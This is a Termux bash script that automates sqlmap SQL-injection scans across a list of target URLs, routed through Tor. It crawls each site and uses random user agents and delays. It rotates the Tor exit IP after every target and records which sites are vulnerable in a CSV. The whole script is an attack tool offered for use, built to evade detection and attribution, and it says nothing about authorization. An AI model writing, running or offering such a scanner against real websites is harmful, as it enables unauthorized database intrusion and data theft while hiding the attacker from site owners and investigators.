#!/data/data/com.termux/files/usr/bin/bash

# 🎨 Colors
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
RESET="\033[0m"

#clear
echo -e "${GREEN}🛡️  Advanced SQLMap + Tor Auto Scanner v5.3${RESET}"

# 🧪 Start Tor if not running
if ! pgrep -x tor > /dev/null; then
    echo -e "${YELLOW}[+] Starting Tor service...${RESET}"
    tor > /dev/null 2>&1 &
    sleep 5
else
    echo -e "${GREEN}[✓] Tor already running${RESET}"
fi

# ⏳ Wait for Tor to fully bootstrap
until torsocks curl -s https://check.torproject.org/ | grep -q "Congratulations"; do
    echo -e "${YELLOW}⏳ Waiting for Tor network to become ready...${RESET}"
    sleep 3
done

# 📁 Prompt for URL file
echo -ne "${BLUE}📁 URL list file (one per line): ${RESET}"
read url_file
url_list=()

if [[ -f "$url_file" ]]; then
    mapfile -t url_list < <(grep -v '^\s*$' "$url_file")
else
    echo -e "${RED}[!] File not found: $url_file${RESET}"
    echo -ne "${BLUE}🌐 Enter a single URL to scan manually: ${RESET}"
    read single_url
    [[ -z "$single_url" ]] && echo -e "${RED}[!] No URL entered. Exiting.${RESET}" && exit 1
    url_list+=("$single_url")
fi

# ⚙️ SQLMap options
echo -ne "${BLUE}⚙️  Extra SQLMap options (e.g. --dbs --current-user): ${RESET}"
read extra_options

# 📂 Create folders
mkdir -p logs
mkdir -p "$HOME/tmp"
csv_file="$HOME/.local/share/sqlmap/output/results-$(date +%d%m%Y_%I%M%p).csv"
echo "Target URL,Place,Parameter,Technique(s),Note(s)" > "$csv_file"

# 🌐 Show Tor IP before scans
echo -ne "${YELLOW}➡️  Tor IP before: ${RESET}"
torsocks curl -s https://ifconfig.me | tee "$HOME/tmp/tor_before_ip.txt"

# 🔁 Loop through URLs
total=${#url_list[@]}
success=0
vulnerable=0
failed=0
count=0

for url in "${url_list[@]}"; do
    count=$((count + 1))
    echo -e "\n${YELLOW}[${count}/${total}] Target: ${url}${RESET}"

    log_name=$(echo "$url" | sed 's|https\?://||; s|[/?=&]|_|g')
    log_file="logs/${log_name}.log"

    echo -e "${BLUE}🚀 Running SQLMap...${RESET}"
    start_time=$(date +%s)

    scan_output=$(torsocks python3 sqlmap/sqlmap.py -u "$url" \
        --crawl=2 \
        --random-agent \
        --timeout=30 \
        --delay=3 \
        --retries=2 \
        --batch \
        --output-dir="$HOME/.local/share/sqlmap/output" \
        $extra_options 2>&1)

    echo "$scan_output" | tee "$log_file"
    end_time=$(date +%s)
    duration=$((end_time - start_time))

    # 🔍 Analyze Result
    if echo "$scan_output" | grep -q "is vulnerable"; then
        echo -e "${GREEN}[✓] Vulnerability Found${RESET}"
        vulnerable=$((vulnerable + 1))
        echo "$url,GET,param,BETU,Vulnerable" >> "$csv_file"
        success=$((success + 1))
    elif echo "$scan_output" | grep -q "parameter\|testing"; then
        echo -e "${BLUE}[✓] Scan Completed${RESET}"
        echo "$url,GET,param,?,Clean" >> "$csv_file"
        success=$((success + 1))
    else
        echo -e "${RED}[✗] Scan Failed or Blocked${RESET}"
        echo "$url,?,?,-,Skipped or Failed" >> "$csv_file"
        failed=$((failed + 1))
    fi

    echo -e "📝 Log saved: ${log_file}"
    echo -ne "${YELLOW}⬅️  Tor IP after: ${RESET}"
    torsocks curl -s https://ifconfig.me

    # 🔄 Rotate Tor
    echo -e "\n${BLUE}🔁 Rotating Tor IP...${RESET}"
    pkill -HUP tor
    sleep 5

    # ⏱️ Adaptive Delay
    if [ "$duration" -lt 20 ]; then
        delay=10
    else
        delay=15
    fi
    echo -e "${YELLOW}⏱️  Sleeping ${delay}s before next scan...${RESET}"
    sleep $delay
    echo "-----------------------------------------------"
done

# 📊 Final Smart Summary
echo -e "\n${GREEN}✅ All scans complete.${RESET}"
echo -e "📄 CSV Summary: ${csv_file}"

echo -e "\n🔔 ${YELLOW}FINAL SUMMARY:${RESET}"
echo -e "🧩 Targets Scanned: ${total}"
echo -e "${GREEN}✅ Successful: ${success}${RESET}"
echo -e "${YELLOW}⚠️ Vulnerable: ${vulnerable}${RESET}"
echo -e "${RED}❌ Skipped or Failed: ${failed}${RESET}"
echo -e "📁 Logs saved to: logs/"
